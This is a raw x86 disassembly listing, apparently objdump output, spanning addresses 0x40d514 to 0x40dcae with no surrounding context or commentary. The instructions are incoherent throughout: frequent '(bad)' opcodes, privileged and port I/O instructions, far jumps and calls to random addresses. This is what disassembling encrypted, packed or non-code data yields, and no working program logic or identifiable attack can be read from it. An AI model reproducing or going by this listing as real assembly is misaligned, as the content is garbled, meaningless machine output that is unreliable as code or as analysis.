  40d514:	pop    ecx
  40d515:	push   ebp
  40d516:	push   ebx
  40d517:	push   esi
  40d518:	ror    DWORD PTR [ebp-0x27],0xf1
  40d51c:	icebp  
  40d51d:	loopne 0x40d4b7
  40d51f:	jbe    0x40d51b
  40d521:	ret    
  40d522:	hlt    
  40d523:	(bad)  
  40d524:	adc    al,0x1e
  40d526:	repz jecxz 0x40d4b9
  40d529:	jmp    0x40d4f4
  40d52b:	bnd cs repz jae 0x40d50e
  40d530:	loopne 0x40d529
  40d532:	cmp    al,0x70
  40d534:	hlt    
  40d535:	push   0xe04b1ce
  40d53a:	sub    eax,0xf59a32db
  40d53f:	add    BYTE PTR [esi+0x1f41ab3b],0x78
  40d546:	or     eax,0x59ba833f
  40d54b:	test   al,0xc2
  40d54d:	inc    ebx
  40d54e:	sub    eax,esp
  40d550:	sbb    al,0xf7
  40d552:	stos   BYTE PTR es:[edi],al
  40d553:	mov    edi,0xfd71fc18
  40d558:	sbb    al,0x85
  40d55a:	dec    edi
  40d55b:	adc    bl,BYTE PTR [ecx+0x2a3dc25b]
  40d561:	mov    ebx,0x6413da26
  40d566:	mov    dh,0x57
  40d568:	mov    al,BYTE PTR [esi]
  40d56a:	push   esi
  40d56b:	mov    esi,0x6a4df7a7
  40d570:	dec    edx
  40d571:	or     bh,BYTE PTR [ebx-0x5e099c08]
  40d577:	stos   DWORD PTR es:[edi],eax
  40d578:	push   cs
  40d579:	mov    dh,0xb
  40d57b:	cmp    al,0x1d
  40d57d:	cmc    
  40d57e:	mov    cl,0x3a
  40d580:	out    dx,eax
  40d581:	cmp    esp,DWORD PTR [ebx-0x7b]
  40d584:	inc    edx
  40d585:	xor    DWORD PTR [ebx-0x7f60778d],edx
  40d58b:	add    esi,esi
  40d58d:	das    
  40d58e:	mov    dl,BYTE PTR [edx-0x1]
  40d591:	mov    ah,0x66
  40d593:	mov    BYTE PTR cs:[ebx+0x78],dh
  40d597:	les    ecx,FWORD PTR [ebp-0x9751205]
  40d59d:	jns    0x40d5a1
  40d59f:	add    DWORD PTR [esi],ebp
  40d5a1:	xor    eax,0xa6e6f670
  40d5a6:	mov    DWORD PTR [ecx+eax*4-0x16],ebx
  40d5aa:	xchg   bl,ah
  40d5ac:	xchg   ebx,eax
  40d5ad:	sbb    cl,BYTE PTR [ebp-0x7b]
  40d5b0:	sub    cl,BYTE PTR [ebx+0x52]
  40d5b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5b4:	pop    ds
  40d5b5:	or     eax,0xe38439f
  40d5ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5bb:	inc    ecx
  40d5bc:	test   eax,0xc65d129e
  40d5c1:	ret    0x339
  40d5c4:	(bad)  
  40d5c5:	mov    ds:0x745bb46c,al
  40d5ca:	jle    0x40d590
  40d5cc:	dec    edi
  40d5cd:	add    DWORD PTR [ebx-0x29],edi
  40d5d0:	stc    
  40d5d1:	mov    dh,BYTE PTR [esi+0x29]
  40d5d4:	stos   BYTE PTR es:[edi],al
  40d5d5:	xchg   esp,eax
  40d5d6:	cs repz dec edi
  40d5d9:	int    0xbc
  40d5db:	dec    esp
  40d5dc:	cmp    dl,BYTE PTR [ebp+0x3]
  40d5df:	mov    ds:0xa3b1a1bd,eax
  40d5e4:	xlat   BYTE PTR ds:[ebx]
  40d5e5:	jge    0x40d588
  40d5e7:	in     eax,0xfc
  40d5e9:	xchg   BYTE PTR [ebp+ecx*8+0x39],bl
  40d5ed:	jmp    0x40d663
  40d5ef:	leave  
  40d5f0:	sti    
  40d5f1:	fwait
  40d5f2:	in     al,0x79
  40d5f4:	dec    eax
  40d5f5:	xchg   esp,eax
  40d5f6:	(bad)  
  40d5f7:	repz lock jmp 0x85df:0xfd0d2807
  40d600:	sti    
  40d601:	sysexit 
  40d603:	hlt    
  40d604:	test   al,0x62
  40d606:	sub    esi,ebx
  40d608:	aas    
  40d609:	scas   al,BYTE PTR es:[edi]
  40d60a:	out    dx,al
  40d60b:	into   
  40d60c:	mov    cl,0xc7
  40d60e:	xchg   ebp,eax
  40d60f:	test   BYTE PTR [esi+0x6bb4437c],cl
  40d615:	outs   dx,BYTE PTR ds:[esi]
  40d616:	mov    cl,BYTE PTR [ebx]
  40d618:	jne    0x40d68a
  40d61a:	or     ch,BYTE PTR [edx-0x60]
  40d61d:	repnz aaa 
  40d61f:	cdq    
  40d620:	mov    ecx,0x542de47b
  40d625:	jmp    0x40d69b
  40d627:	out    0x65,eax
  40d629:	or     ebp,DWORD PTR ds:0xb7a61800
  40d62f:	sbb    DWORD PTR [edi+0x6d1785aa],edx
  40d635:	scas   al,BYTE PTR es:[edi]
  40d636:	cld    
  40d637:	xchg   DWORD PTR [esi+0x2c],edi
  40d63a:	retf   0x8ac5
  40d63d:	xlat   BYTE PTR ds:[ebx]
  40d63e:	push   ecx
  40d63f:	push   edi
  40d640:	enter  0x9646,0x16
  40d644:	push   eax
  40d645:	lea    esp,[edx]
  40d647:	xlat   BYTE PTR ds:[ebx]
  40d648:	mov    esi,0xd0525f12
  40d64d:	or     al,0x96
  40d64f:	clc    
  40d650:	fcom   DWORD PTR [edx-0x301b0113]
  40d656:	jp     0x40d5fe
  40d658:	mov    edi,0x4b77f975
  40d65d:	(bad)  
  40d65e:	call   0x862f57f6
  40d663:	push   edi
  40d664:	shr    DWORD PTR [ebx-0x74],1
  40d667:	or     al,0xad
  40d669:	push   es
  40d66a:	jg     0x40d641
  40d66c:	inc    edx
  40d66d:	push   eax
  40d66e:	push   esi
  40d66f:	mov    eax,0xde037328
  40d674:	mov    edi,0xcee2327a
  40d679:	jecxz  0x40d659
  40d67b:	(bad)  
  40d67c:	jbe    0x40d6aa
  40d67e:	add    BYTE PTR [ebx-0x49],ch
  40d681:	push   ebx
  40d682:	test   cl,cl
  40d684:	or     ebp,DWORD PTR [ebx]
  40d686:	xor    al,0x46
  40d688:	and    al,0x47
  40d68a:	daa    
  40d68b:	out    dx,al
  40d68c:	imul   ebp,DWORD PTR [edi+0x3],0xb1ce15f3
  40d693:	repz adc DWORD PTR [edx-0x7f4c7f42],0xa9ccd9c1
  40d69e:	jo     0x5bda9e47
  40d6a4:	add    bh,dh
  40d6a6:	sbb    ebp,DWORD PTR [ecx+esi*4-0x50b620e6]
  40d6ad:	sub    cl,0x90
  40d6b0:	ret    0x24d5
  40d6b3:	mov    dh,0x78
  40d6b5:	sbb    eax,0xd67f112f
  40d6ba:	and    al,0xe4
  40d6bc:	out    0x4e,eax
  40d6be:	aam    0x18
  40d6c0:	xchg   esp,eax
  40d6c1:	fisubr DWORD PTR [ecx]
  40d6c3:	stos   BYTE PTR es:[edi],al
  40d6c4:	cmp    DWORD PTR [ecx-0x4eb85096],edi
  40d6ca:	adc    BYTE PTR [edx-0xa0957d6],al
  40d6d0:	inc    edx
  40d6d1:	dec    ecx
  40d6d2:	mov    ch,0x5f
  40d6d4:	in     eax,0x81
  40d6d6:	sti    
  40d6d7:	aaa    
  40d6d8:	hlt    
  40d6d9:	xchg   edx,eax
  40d6da:	push   0x7c794aca
  40d6df:	rcl    dh,0x89
  40d6e2:	mov    DWORD PTR [ebp-0x4be85053],ecx
  40d6e8:	repz ds call 0x639c:0xea584b2f
  40d6f1:	jg     0x40d75e
  40d6f3:	push   cs
  40d6f4:	scas   eax,DWORD PTR es:[edi]
  40d6f5:	lods   al,BYTE PTR ds:[esi]
  40d6f6:	cmp    eax,0x7b70475f
  40d6fb:	jmp    0x40d748
  40d6fd:	fidivr DWORD PTR [esp+edx*2+0x22]
  40d701:	lods   eax,DWORD PTR ds:[esi]
  40d702:	dec    esi
  40d703:	add    eax,0xd4be4f50
  40d708:	push   ecx
  40d709:	sbb    edi,esi
  40d70b:	or     BYTE PTR [ebp-0x5c2ab370],bh
  40d711:	bound  ebp,QWORD PTR [esi+esi*2-0x60]
  40d715:	xor    DWORD PTR [edx+0x1c],eax
  40d718:	enter  0x28bd,0x20
  40d71c:	inc    edx
  40d71d:	out    dx,al
  40d71e:	xlat   BYTE PTR ds:[ebx]
  40d71f:	adc    cl,BYTE PTR [edx-0x74eab733]
  40d725:	fiadd  WORD PTR ds:0xc515110a
  40d72b:	(bad)  
  40d72c:	pop    ecx
  40d72d:	test   eax,0xbec5d1c3
  40d732:	in     eax,dx
  40d733:	repz push edi
  40d735:	lods   eax,DWORD PTR ds:[esi]
  40d736:	enter  0x89f5,0x23
  40d73a:	push   ds
  40d73b:	xor    ecx,DWORD PTR [ebx-0x58471bf2]
  40d741:	scas   al,BYTE PTR es:[edi]
  40d742:	push   ss
  40d743:	outs   dx,DWORD PTR ds:[esi]
  40d744:	mov    bh,0xb6
  40d746:	imul   edx,DWORD PTR [ecx+0x4f],0x8a5517a9
  40d74d:	inc    ebx
  40d74e:	out    dx,eax
  40d74f:	cmp    DWORD PTR [ebx+0x38],esp
  40d752:	adc    dh,BYTE PTR [edi]
  40d754:	xchg   edi,eax
  40d755:	mov    esp,0x150f67b2
  40d75a:	push   es
  40d75b:	jb     0x40d7a7
  40d75d:	fs mov eax,0xd2dbae28
  40d763:	or     BYTE PTR [edi-0x46],ch
  40d766:	inc    ebp
  40d767:	addr16 cs js 0x40d758
  40d76b:	sub    eax,0x21ef20d4
  40d770:	jg     0x40d7ae
  40d772:	popf   
  40d773:	les    ebx,FWORD PTR [ecx+0x4a]
  40d776:	push   edx
  40d777:	das    
  40d778:	cmp    DWORD PTR [esi-0x4e],eax
  40d77b:	xchg   bp,ax
  40d77d:	xor    bl,BYTE PTR [eax-0x313cbe60]
  40d783:	(bad)  
  40d784:	fiadd  DWORD PTR [edi+0x18efa7de]
  40d78a:	cwde   
  40d78b:	cld    
  40d78c:	clc    
  40d78d:	add    eax,DWORD PTR [eax]
  40d78f:	and    eax,0x589125a9
  40d794:	xchg   esi,eax
  40d795:	xor    esi,DWORD PTR [edx+0x23]
  40d798:	pop    es
  40d799:	das    
  40d79a:	pop    ebx
  40d79b:	mov    esp,DWORD PTR [edi-0x79]
  40d79e:	push   esi
  40d79f:	jbe    0x40d762
  40d7a1:	fdiv   DWORD PTR [edi]
  40d7a3:	adc    ecx,esp
  40d7a5:	pushf  
  40d7a6:	or     bl,dh
  40d7a8:	sub    al,0xca
  40d7aa:	hlt    
  40d7ab:	js     0x40d7af
  40d7ad:	inc    ebx
  40d7ae:	std    
  40d7af:	xor    eax,DWORD PTR [ecx]
  40d7b1:	stos   BYTE PTR es:[edi],al
  40d7b2:	out    0x4a,al
  40d7b4:	frstor ds:0x1b38b4c2
  40d7ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7bb:	dec    DWORD PTR [edi]
  40d7bd:	push   ebp
  40d7be:	xor    al,0xa3
  40d7c0:	ret    0x1731
  40d7c3:	sub    ebp,DWORD PTR [ebp-0x64]
  40d7c6:	sbb    eax,0xf8f447ea
  40d7cb:	inc    di
  40d7cd:	xchg   edx,eax
  40d7ce:	add    esp,DWORD PTR [edx]
  40d7d0:	pop    ss
  40d7d1:	outs   dx,DWORD PTR ds:[esi]
  40d7d2:	and    eax,DWORD PTR [edx-0x35]
  40d7d5:	call   0x2efa8c8a
  40d7da:	push   ds
  40d7db:	fldenv [edx-0x2e]
  40d7de:	shr    DWORD PTR [esi-0x1a],cl
  40d7e1:	in     eax,dx
  40d7e2:	test   al,0x2e
  40d7e4:	pop    ebx
  40d7e5:	or     edx,ecx
  40d7e7:	cld    
  40d7e8:	dec    esi
  40d7e9:	sub    ch,BYTE PTR [ecx+0x79cebf2a]
  40d7ef:	mov    al,ds:0x463faaa2
  40d7f4:	add    DWORD PTR [eax+0x3],edi
  40d7f7:	or     cl,bl
  40d7f9:	xchg   ebx,eax
  40d7fa:	dec    edx
  40d7fb:	out    0x99,al
  40d7fd:	jne    0x40d7b0
  40d7ff:	cli    
  40d800:	lods   eax,DWORD PTR ds:[esi]
  40d801:	pop    ecx
  40d802:	jmp    0x3efc:0x2f20b282
  40d809:	(bad)  
  40d80a:	jno    0x40d7a8
  40d80c:	dec    esi
  40d80d:	xchg   BYTE PTR [esi-0x3d682759],cl
  40d813:	add    dh,BYTE PTR [ebp+0x3e]
  40d816:	sbb    DWORD PTR [eax+0x26],eax
  40d819:	loop   0x40d829
  40d81b:	pop    es
  40d81c:	xchg   edx,eax
  40d81d:	sub    eax,0xc46e9451
  40d822:	fimul  WORD PTR ds:0xde597f39
  40d828:	mov    eax,0x71fc8651
  40d82d:	or     ah,BYTE PTR [ebx-0x7d]
  40d830:	or     eax,0x5c2115ab
  40d835:	enter  0xcc59,0x1c
  40d839:	rcl    DWORD PTR [eax-0x28],cl
  40d83c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d83d:	xlat   BYTE PTR ds:[ebx]
  40d83e:	shl    dh,0x77
  40d841:	(bad)
  40d845:	jo     0x40d7e9
  40d847:	or     ebx,esi
  40d849:	arpl   WORD PTR [ecx+0x6411c874],bx
  40d84f:	and    edx,ecx
  40d851:	jns    0x40d82c
  40d853:	or     bh,BYTE PTR [ecx-0x52aa0698]
  40d859:	adc    esp,DWORD PTR [ebx+esi*4-0xc]
  40d85d:	inc    ecx
  40d85e:	pop    edx
  40d85f:	retf   
  40d860:	jnp    0x40d844
  40d862:	push   ebx
  40d863:	add    DWORD PTR [edi+0x2f],0x3f
  40d867:	(bad)  [ebx+0x185d46a8]
  40d86d:	in     eax,dx
  40d86e:	(bad)  
  40d870:	dec    eax
  40d871:	jo     0x40d85c
  40d873:	inc    ecx
  40d874:	popf   
  40d875:	push   es
  40d876:	ret    
  40d877:	sbb    eax,0xcfa84656
  40d87c:	mov    eax,ds:0xef8da85a
  40d881:	mov    al,ds:0x4caaacde
  40d886:	and    dl,BYTE PTR [edx-0x7]
  40d889:	adc    al,0x32
  40d88b:	lea    ebp,[ebx*1-0xcc318b0]
  40d892:	inc    ecx
  40d893:	dec    ebp
  40d894:	sbb    edi,DWORD PTR [eax]
  40d896:	mov    esi,0xcb182789
  40d89b:	rcl    DWORD PTR [esp+ecx*2],cl
  40d89e:	loope  0x40d91f
  40d8a0:	or     al,0xb6
  40d8a2:	jg     0x40d918
  40d8a4:	xchg   edx,eax
  40d8a5:	test   DWORD PTR [edi],0x8898fbe2
  40d8ab:	das    
  40d8ac:	pop    ecx
  40d8ad:	xchg   ebp,eax
  40d8ae:	outs   dx,DWORD PTR ds:[esi]
  40d8af:	sbb    edi,DWORD PTR [edi-0x5f]
  40d8b2:	mov    al,ds:0xf81394ac
  40d8b7:	and    al,0x6b
  40d8ba:	aam    0x8f
  40d8bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8bd:	fld    TBYTE PTR [ebp-0x7219142c]
  40d8c3:	dec    edi
  40d8c4:	hlt    
  40d8c5:	sti    
  40d8c6:	adc    DWORD PTR ds:0xf52b03d7,ecx
  40d8cc:	mov    bl,BYTE PTR [ebx+0x2eff9957]
  40d8d2:	sub    al,0x5a
  40d8d4:	ret    0x9604
  40d8d7:	xor    ebx,edx
  40d8d9:	sbb    eax,0x8f2361c1
  40d8de:	(bad)  
  40d8df:	jne    0x40d91d
  40d8e1:	test   eax,0xdcb5b560
  40d8e6:	(bad)  
  40d8e8:	retf   0x8d3a
  40d8eb:	xor    DWORD PTR [edi-0x68],ebp
  40d8ee:	or     BYTE PTR [ebp-0x358d812c],dh
  40d8f4:	(bad)  
  40d8f6:	ja     0x40d8b3
  40d8f8:	cmp    dh,BYTE PTR [ecx-0x28a5f871]
  40d8fe:	push   edi
  40d8ff:	jmp    0xf632:0x7e710bd7
  40d906:	push   ebx
  40d907:	es and eax,0xd9d34687
  40d90d:	cli    
  40d90e:	(bad)  
  40d910:	mov    dl,0xc2
  40d912:	inc    ebp
  40d913:	jle    0x40d917
  40d915:	mov    eax,0xd0d780c8
  40d91a:	dec    esi
  40d91b:	cmp    BYTE PTR [ebx-0x5e],0xc7
  40d91f:	nop
  40d920:	rcl    dh,0x41
  40d923:	pop    esi
  40d924:	pop    esi
  40d925:	ss ror dh,cl
  40d928:	push   edi
  40d929:	lea    ecx,ds:0x7c50271a
  40d92f:	fild   QWORD PTR [eax+0x1b7ffd0b]
  40d935:	and    al,0x3d
  40d937:	in     al,0x28
  40d939:	cmp    ah,BYTE PTR [ebx-0x529fd446]
  40d93f:	mov    dl,0x9f
  40d941:	test   al,0x11
  40d943:	out    dx,eax
  40d944:	outs   dx,BYTE PTR ds:[esi]
  40d945:	or     BYTE PTR [eax-0x6f],0x62
  40d949:	mov    al,0x26
  40d94b:	sahf   
  40d94c:	jns    0x40d928
  40d94e:	jnp    0x40d977
  40d950:	scas   al,BYTE PTR es:[edi]
  40d951:	sub    DWORD PTR [ebx],esp
  40d953:	lods   eax,DWORD PTR ds:[esi]
  40d954:	lock jmp 0x40d9c5
  40d957:	cli    
  40d958:	fsub   DWORD PTR [edi+0x5e4a31df]
  40d95e:	neg    DWORD PTR ds:0x1fd814c2
  40d964:	pop    eax
  40d965:	mov    WORD PTR [eax],gs
  40d967:	sub    al,0xf9
  40d969:	popf   
  40d96a:	jnp    0x40d9b1
  40d96c:	rcr    ecx,cl
  40d96e:	test   al,0x1d
  40d970:	inc    edx
  40d971:	inc    edi
  40d972:	and    edx,esp
  40d974:	hlt    
  40d975:	test   ah,ah
  40d977:	mov    al,0xdb
  40d979:	jmp    0xcad6:0x7f40a86d
  40d980:	sbb    al,0x40
  40d982:	and    DWORD PTR [ecx+0x3fab124b],esp
  40d988:	dec    ecx
  40d989:	test   al,0x2f
  40d98b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d98c:	mov    ch,dl
  40d98e:	sbb    BYTE PTR [ecx+0x3d],ch
  40d991:	aad    0x3d
  40d993:	and    bh,BYTE PTR [edx+ebx*8]
  40d996:	sbb    eax,0x4e70a662
  40d99b:	int    0xa1
  40d99d:	mov    ds:0x6f392c94,eax
  40d9a2:	arpl   WORD PTR [edx-0x1],di
  40d9a5:	xor    dl,dl
  40d9a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9a8:	es clc 
  40d9aa:	out    dx,al
  40d9ab:	jmp    DWORD PTR [eax]
  40d9ad:	add    al,0xec
  40d9af:	mov    WORD PTR [edi],es
  40d9b1:	sti    
  40d9b2:	or     bl,cl
  40d9b4:	enter  0x985d,0xa8
  40d9b8:	inc    edi
  40d9b9:	jle    0x40d9be
  40d9bb:	test   al,0xb0
  40d9bd:	rol    dh,1
  40d9bf:	mov    ecx,0xe4145948
  40d9c4:	test   DWORD PTR [ebx-0x68],0xc67c5a8e
  40d9cb:	mov    DWORD PTR [edi+0x17c20ed8],edx
  40d9d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9d2:	sti    
  40d9d3:	dec    eax
  40d9d4:	add    bh,dl
  40d9d6:	in     eax,0xf
  40d9d8:	mov    ebp,0x43d795db
  40d9dd:	rcr    DWORD PTR [edx+0x40],1
  40d9e0:	adc    eax,0xe3e33d86
  40d9e5:	adc    esi,0x64b7626d
  40d9eb:	clc    
  40d9ec:	int3   
  40d9ed:	sub    eax,0xad725e22
  40d9f2:	dec    edx
  40d9f3:	sbb    ebx,eax
  40d9f5:	std    
  40d9f6:	cmp    ah,BYTE PTR [ecx]
  40d9f8:	neg    cl
  40d9fa:	mov    edi,0x16499eb
  40d9ff:	in     eax,0x72
  40da01:	fbstp  TBYTE PTR [edx]
  40da03:	or     eax,0xd8011dc3
  40da08:	sbb    eax,0xe5fc3d0d
  40da0d:	and    BYTE PTR [ecx+0x218009f1],al
  40da13:	sub    BYTE PTR [eax-0x1e6bd34e],dh
  40da19:	add    bh,dl
  40da1b:	sub    ah,BYTE PTR [edx+ecx*1]
  40da1e:	xchg   BYTE PTR [ebp+0xab28bc7],bh
  40da24:	xchg   edx,eax
  40da25:	mov    al,ds:0x8666f03c
  40da2a:	adc    BYTE PTR [ebp+0x7bfc5cad],0xcb
  40da31:	out    dx,al
  40da32:	hlt    
  40da33:	enter  0x3d4,0x34
  40da37:	sbb    DWORD PTR [edx-0x4a477dd9],esi
  40da3d:	pop    ss
  40da3e:	aam    0x85
  40da40:	dec    ebp
  40da41:	outs   dx,DWORD PTR ds:[esi]
  40da42:	pop    ecx
  40da43:	stc    
  40da44:	sbb    eax,0xb0ec483f
  40da49:	out    0xfa,al
  40da4b:	sar    BYTE PTR ds:0x73ad50bd,0x25
  40da52:	out    dx,eax
  40da53:	push   esp
  40da54:	mov    esi,0x8fcd2e96
  40da59:	call   0x7c054de1
  40da5e:	inc    edx
  40da5f:	sub    ch,BYTE PTR [edi]
  40da61:	inc    ch
  40da63:	mov    bh,0xfd
  40da65:	(bad)  
  40da66:	cmc    
  40da67:	dec    ecx
  40da68:	rcr    DWORD PTR [ebp*4+0x11391baf],0x2f
  40da70:	pminub mm1,mm6
  40da73:	dec    ebp
  40da74:	ja     0x40da03
  40da76:	or     DWORD PTR [edx+0x41fcb78c],edx
  40da7c:	push   es
  40da7d:	mov    bh,0xe6
  40da7f:	push   cs
  40da80:	iret   
  40da81:	stos   DWORD PTR es:[edi],eax
  40da82:	jne    0x40da36
  40da84:	cdq    
  40da85:	inc    ebp
  40da86:	xor    eax,0x10c28b9a
  40da8b:	jecxz  0x40da40
  40da8d:	mov    edx,0x89c15d24
  40da92:	shr    DWORD PTR [esi],cl
  40da94:	mov    dl,0x28
  40da96:	push   0x98654588
  40da9b:	aas    
  40da9c:	out    0x7d,al
  40da9e:	out    dx,al
  40da9f:	push   esp
  40daa0:	scas   al,BYTE PTR es:[edi]
  40daa1:	sbb    DWORD PTR [edi],edi
  40daa3:	pop    ss
  40daa4:	test   eax,0x64a8d97e
  40daa9:	jge    0x40da7e
  40daab:	add    ch,BYTE PTR [edx-0x6a]
  40daae:	out    0x2d,al
  40dab0:	fiadd  DWORD PTR [esi]
  40dab2:	and    al,0xd0
  40dab4:	int3   
  40dab5:	mov    esp,0x2af78c1b
  40daba:	pop    esp
  40dabb:	xchg   ebx,eax
  40dabc:	dec    esp
  40dabd:	test   ah,al
  40dabf:	or     ebp,esi
  40dac1:	dec    edx
  40dac2:	xchg   ebx,eax
  40dac3:	jb     0x40db26
  40dac5:	and    edi,DWORD PTR [ecx]
  40dac7:	ins    BYTE PTR es:[edi],dx
  40dac8:	inc    esi
  40dac9:	xchg   ebp,eax
  40daca:	data16 loopne 0x40daff
  40dacd:	mov    edx,0x1b767152
  40dad2:	sbb    BYTE PTR [ebp-0x22a1405c],ah
  40dad8:	lea    eax,[eax+0x30465a0a]
  40dade:	mov    ds:0xc7a87353,al
  40dae3:	int3   
  40dae4:	arpl   WORD PTR [edi+0x7b],dx
  40dae7:	pop    ecx
  40dae8:	inc    esp
  40dae9:	xlat   BYTE PTR ds:[ebx]
  40daea:	test   BYTE PTR [eax-0x1e9937bc],dh
  40daf0:	jmp    0xf78782fc
  40daf5:	add    cl,BYTE PTR [eax+0x57144b19]
  40dafb:	into   
  40dafc:	test   BYTE PTR [edx],cl
  40dafe:	mov    al,ds:0x416246d0
  40db03:	or     ebx,ecx
  40db05:	jmp    DWORD PTR [esi+0x3ff5c283]
  40db0b:	pop    edx
  40db0c:	jge    0x40dab7
  40db0e:	ret    
  40db0f:	outs   dx,DWORD PTR ds:[esi]
  40db10:	xchg   ecx,eax
  40db11:	mov    dh,0xeb
  40db13:	arpl   WORD PTR [esi+edi*1],cx
  40db16:	and    BYTE PTR [eax+0x37],0x81
  40db1a:	or     esi,DWORD PTR [ebx+0x68]
  40db1d:	sahf   
  40db1e:	mov    eax,ds:0x6f7d009f
  40db23:	into   
  40db24:	inc    edx
  40db25:	dec    esi
  40db26:	popa   
  40db27:	adc    edx,esi
  40db29:	cwde   
  40db2a:	adc    BYTE PTR [esi+edx*4+0x15adb800],0x46
  40db32:	push   eax
  40db33:	xor    BYTE PTR [edx-0xc],0x44
  40db37:	(bad)  
  40db38:	addr16 cmp al,0x87
  40db3b:	or     eax,0x2a74751f
  40db40:	(bad)  
  40db41:	adc    ah,BYTE PTR fs:[ecx]
  40db44:	loope  0x40daf3
  40db46:	sbb    dl,dl
  40db48:	ja     0x40dbb7
  40db4a:	rcr    DWORD PTR [esi+0x38],cl
  40db4d:	(bad)  
  40db4e:	or     eax,0x2bea4e2d
  40db53:	lods   eax,DWORD PTR ds:[esi]
  40db54:	mov    dh,0xec
  40db56:	sbb    eax,0xd5b9935a
  40db5b:	jmp    DWORD PTR [ebp+0x58]
  40db5e:	fisttp DWORD PTR [ecx]
  40db60:	out    dx,eax
  40db61:	(bad)  
  40db62:	ins    BYTE PTR es:[edi],dx
  40db63:	pop    ebx
  40db64:	lock fcomp DWORD PTR [ebp+0x4e832b15]
  40db6b:	enter  0xd8f9,0x1f
  40db6f:	mov    edx,DWORD PTR [edx-0x30]
  40db72:	mov    ecx,0xee618de2
  40db77:	aam    0x8c
  40db79:	xor    al,dl
  40db7b:	sbb    BYTE PTR [esi+0x1a],ch
  40db7e:	fiadd  DWORD PTR [edx]
  40db80:	in     eax,0xf4
  40db82:	pop    esp
  40db83:	mov    al,0x3d
  40db85:	test   eax,0x3892921c
  40db8a:	add    BYTE PTR [esi+0x131659b8],bh
  40db90:	call   0xfd81:0xc3a819b1
  40db97:	and    eax,0xc3a8a1f0
  40db9c:	dec    esp
  40db9d:	xchg   ecx,eax
  40db9e:	xor    eax,0x46e10f47
  40dba3:	mov    ch,0x52
  40dba5:	add    BYTE PTR [ecx+esi*8],0xce
  40dba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbaa:	in     al,0x22
  40dbac:	aas    
  40dbad:	shr    BYTE PTR [edx+0x7aaa0f29],cl
  40dbb3:	dec    esi
  40dbb4:	in     al,0xd4
  40dbb6:	imul   ebx,DWORD PTR [eax-0x70b86c4],0x3e06c9c3
  40dbc0:	jno    0x40dc29
  40dbc2:	xchg   edx,eax
  40dbc3:	add    BYTE PTR ss:[edi-0x5519ef69],0x2f
  40dbcb:	fucom  st(3)
  40dbcd:	xor    BYTE PTR [ebp+0x6c],al
  40dbd0:	xchg   BYTE PTR [ecx-0x3f46c282],ch
  40dbd6:	adc    al,0x70
  40dbd8:	sti    
  40dbd9:	sub    WORD PTR [ebp-0x6566641],bp
  40dbe0:	mov    ch,0x73
  40dbe2:	and    dh,BYTE PTR [edi]
  40dbe4:	and    DWORD PTR [esi+0x11],eax
  40dbe7:	das    
  40dbe8:	or     al,0x53
  40dbea:	pop    ss
  40dbeb:	cwde   
  40dbec:	mov    ch,0xe8
  40dbee:	sti    
  40dbef:	gs jl  0x40dc1a
  40dbf2:	in     eax,dx
  40dbf3:	shl    dh,0x88
  40dbf6:	and    al,BYTE PTR [ebx]
  40dbf8:	mov    ebp,0xef82cc5f
  40dbfd:	cwde   
  40dbfe:	sbb    al,0x30
  40dc00:	ins    BYTE PTR es:[edi],dx
  40dc01:	outs   dx,BYTE PTR ds:[esi]
  40dc02:	bound  edi,QWORD PTR [edx-0x2a]
  40dc05:	inc    BYTE PTR [eax+0x4ef85af]
  40dc0b:	mov    eax,0xbba92a4d
  40dc10:	inc    edi
  40dc11:	lahf   
  40dc12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc13:	stos   BYTE PTR es:[edi],al
  40dc14:	cmp    al,bh
  40dc16:	xchg   ebp,eax
  40dc17:	push   edx
  40dc18:	ficom  WORD PTR [edi-0x69]
  40dc1b:	leave  
  40dc1c:	xchg   esp,eax
  40dc1d:	pop    ss
  40dc1e:	sub    ebx,DWORD PTR [edx+0x3e]
  40dc21:	ja     0x40dc4a
  40dc23:	popf   
  40dc24:	xchg   ecx,eax
  40dc25:	test   ch,ch
  40dc27:	dec    edx
  40dc28:	and    edi,DWORD PTR [edi-0x2b]
  40dc2b:	das    
  40dc2c:	push   eax
  40dc2d:	retf   
  40dc2e:	(bad)  
  40dc2f:	rcl    BYTE PTR ds:0xb6df56e,cl
  40dc35:	xor    al,0xc0
  40dc37:	ret    0x912a
  40dc3a:	adc    DWORD PTR [ebx+esi*8-0x137ae889],esp
  40dc41:	test   al,0xcf
  40dc43:	dec    esi
  40dc44:	(bad)  
  40dc45:	aaa    
  40dc46:	sub    BYTE PTR ds:0x4d10a93d,0x19
  40dc4d:	add    DWORD PTR [ebx-0x7fef0205],edi
  40dc53:	jmp    FWORD PTR [edx+eiz*8-0x47f8d0c9]
  40dc5a:	call   0x66cf:0x9fb052d9
  40dc61:	mov    al,0x61
  40dc63:	pop    eax
  40dc64:	adc    al,0x13
  40dc66:	cld    
  40dc67:	jae    0x40dc56
  40dc69:	das    
  40dc6a:	mov    ds:0x5fabea26,al
  40dc6f:	push   ebp
  40dc70:	mov    edi,0xe23c6f9f
  40dc75:	xchg   esi,eax
  40dc76:	push   es
  40dc77:	dec    ebx
  40dc78:	mov    edx,0xbc2ca6ef
  40dc7d:	out    dx,eax
  40dc7e:	outs   dx,BYTE PTR ds:[esi]
  40dc7f:	sahf   
  40dc80:	inc    eax
  40dc81:	dec    ecx
  40dc82:	sbb    al,0xbe
  40dc84:	jmp    0x40dc7e
  40dc86:	add    al,bh
  40dc88:	repz push esi
  40dc8a:	add    al,0x75
  40dc8c:	fst    DWORD PTR [ecx+0x77a8ace0]
  40dc92:	fdiv   DWORD PTR [ebx+0x11]
  40dc95:	cmp    DWORD PTR [ebp-0x34e44be2],edi
  40dc9b:	std    
  40dc9c:	cmp    dl,BYTE PTR [eax-0x1b744d24]
  40dca2:	sar    ah,cl
  40dca4:	test   BYTE PTR [edx],bl
  40dca6:	pusha  
  40dca7:	inc    ebx
  40dca8:	retf   
  40dca9:	xor    al,0xa0
  40dcab:	adc    al,0x70
  40dcad:	aaa    
  40dcae:	jecxz  0x40dd1a
